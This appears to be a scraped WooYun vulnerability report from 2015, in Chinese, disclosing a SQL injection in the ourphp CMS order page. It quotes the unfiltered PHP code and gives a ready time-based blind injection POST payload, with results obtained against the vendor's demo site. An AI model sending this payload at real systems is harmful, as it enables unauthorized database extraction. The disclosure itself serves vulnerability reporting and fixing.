{"id": 33662, "wybug_id": "wooyun-2015-0108309", "wybug_title": "ourphp最新版注入漏洞1枚(demo演示)1", "wybug_corp": "ourphp.net", "wybug_author": "路人甲", "wybug_date": "2015-04-17 15:54", "wybug_open_date": "2015-07-16 16:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向公众公开  简要描述： ourphp最新版注入漏洞1枚(可出任意数据，demo演示) 详细说明：  看到wooyun上ourphp这个厂商又出新的版本了，说修改了wooyun上现有的漏洞，我也来凑凑热闹吧。下载最新版本（ourphp_v1.2.0.20150414），2015-04-14更新的，研究学习一下。注入一枚： POST /?cn-shoppingorders.html-&ourphp_cms=buy  POST参数中存在可注入的参数，看代码\n无关代码elseif ($_GET[\"ourphp_cms\"] == \"buy\"){if($_POST['shoppingname'] == '' || $_POST['shoppingtel'] == '' || $_POST['shoppingadd'] == ''){\texit(\"<script language=javascript> alert('\".$bookadd.\"');location.replace('\".$ourphp_webpath.\"?\".$ourphp_Language.\"-shoppingcart.html');</script>\");}\t\t\tif (!empty($_POST[\"ourphp_opcms\"])){ //在这里获取ourphp_opcms参数\t\t\t$a = implode(',',$_POST[\"ourphp_opcms\"]);//注入时逗号不能用了\t\t\t$b = str_replace(',|,','|',$a);\t\t\t$ourphp_opcms = substr($b, 0, -2); //去掉了最后两个字母\t\t\t}else{\t\t\texit(\"no!\");\t\t\t}\t\t\t\t\t\t$fg = explode('|',$ourphp_opcms);\t\t\tforeach($fg as $op){\t\t\t$opcms = explode(',',$op);\t\t\t$sql=\"insert into `ourphp_orders` set \t\t\t`OP_Ordersname` = '\".dowith_sql($opcms[1]).\"',\t\t\t`OP_Ordersid` = '\".dowith_sql($opcms[0]).\"',\t\t\t`OP_Ordersnum` = '\".dowith_sql($opcms[7]).\"',\t\t\t`OP_Ordersemail` = '\".$_SESSION['username'].\"',\t\t\t`OP_Ordersusername` = '\".dowith_sql($_POST['shoppingname']).\"',\t\t\t`OP_Ordersusertel` = '\".dowith_sql($_POST['shoppingtel']).\"',\t\t\t`OP_Ordersuseradd` = '\".dowith_sql($_POST['shoppingadd']).\"',\t\t\t`OP_Ordersusetext` = '\".dowith_sql($opcms[8]).\"',\t\t\t`OP_Ordersproductatt` = '\".dowith_sql($opcms[2]).\"',\t\t\t`OP_Orderswebmarket` = '\".dowith_sql($opcms[5]).\"',\t\t\t`OP_Ordersusermarket` = '\".dowith_sql($opcms[6]).\"',\t\t\t`OP_Ordersweight` = '\".dowith_sql($opcms[3]).\"',\t\t\t`OP_Ordersfreight` = '\".ourphp_freight(dowith_sql($_POST['shoppingadd']),$opcms[3],$opcms[4],dowith_sql($opcms[7])).\"',//关键在这里，可以看到$opcms[4]没有使用dowith_sql()\t\t\t`time` = '\".date(\"Y-m-d H:i:s\").\"',\t\t\t`OP_Ordersnumber` = '\".'OP'.randomkeys(7).\"',\t\t\t`OP_Orderssend` = 1,\t\t\t`OP_Orderspay` = 1\t\t\t\";\t\t\t$query=mysql_query($sql);\t\t\t}\t\t\t\t\t\t$sql=\"delete from ourphp_shoppingcart where OP_Shopusername = '\".$_SESSION['username'].\"'\";\t\t\t$query=mysql_query($sql);\t\t\texit(\"<script language=javascript>location.replace('\".$ourphp_webpath.\"?\".$ourphp_Language.\"-shoppingorders.html');</script>\");\n跟进ourphp_freight()，见上面代码的注释，有个参数没有过滤\nfunction ourphp_freight($add,$weight,$freight,$number){ \t\t\tglobal $db;\t\t\t$ourphp_rs = $db-> ourphpsql(\"select `OP_Freighttext`,`OP_Freightweight` from `ourphp_freight` where `id` = \".$freight);\t\t\t$freightop = explode('|',$ourphp_rs[0]); //首重\t\t\t$weightop = $ourphp_rs[1]; //续重\t\t\t\t\t\t$city = explode('|','北京市|天津市|上海市|重庆市|国外|河北省|河南省|云南省|辽宁省|黑龙江省|湖南省|安徽省|山东省|新疆|江苏省|浙江省|江西省|湖北省|广西|甘肃省|山西省|内蒙古|陕西省|吉林省|福建省|贵州省|广东省|青海省|西藏|四川省|宁夏|海南省|台湾省|香港|澳门');\t\t\t$i=0;\t\t\tforeach($city as $op){\t\t\t\tif(strstr($add,$op)){\t\t\t\t\t$ok = $i;\t\t\t\t\tbreak;\t\t\t\t}else{\t\t\t\t\t$ok = 4;\t\t\t\t}\t\t\t\t$i += 1;\t\t\t}\t\t\t\t\t\tif($number < 2){\t\t\t\tif($weight < 2){\t\t\t\t$yf = $freightop[$ok];\t\t\t\t}else{\t\t\t\t$yf = ($weight - 1) * $weightop + $freightop[$ok];\t\t\t\t}\t\t\t}else{\t\t\t\t\t\t\t$yfop = $number * $weight;\t\t\t\t$yf = ($yfop - 1) * $weightop + $freightop[$ok];\t\t\t\t\t\t\t}\t\t\treturn $yf;}\n$freight也是就$opcms[4]没有经过dowith_sql()的过滤，这里可以注入，由于不能使用逗号，这里盲注吧Payload:POST提交（因为代码过程中会去掉PAYLOAD的最后两个字母，所以payload最后可随意写两个任意字母）\nshoppingname=pigtest&shoppingtel=13599450932&shoppingadd=12&Submit=%E6%94%B6%E9%93%B6%E5%8F%B0%E7%BB%93%E7%AE%97&ourphp_opcms[]=123&ourphp_opcms[]=456&ourphp_opcms[]=789&ourphp_opcms[]=000&ourphp_opcms[]=-1/**/or/**/(/**/select/**/case/**/when/**/(/**/select/**/user()/**/from/**/(/**/select/**/*/**/from/**/ourphp_user)/**/as/**/a/**/)/**/like/**/'z%'/**/then/**/sleep(1)/**/else/**/sleep(0)/**/end)/**/%23aa\n本地测试如下：因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，不延迟，如下图\n\n若正确，延迟，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试本地管理员用户名为：adminDemo测试数据如下：Demo的数据库user为：ourphp@localhostDemo的Mysql版本：5.5.37Demo的数据库：ourphp   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-04-17 16:29 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-25 21:04 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  urphp!    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}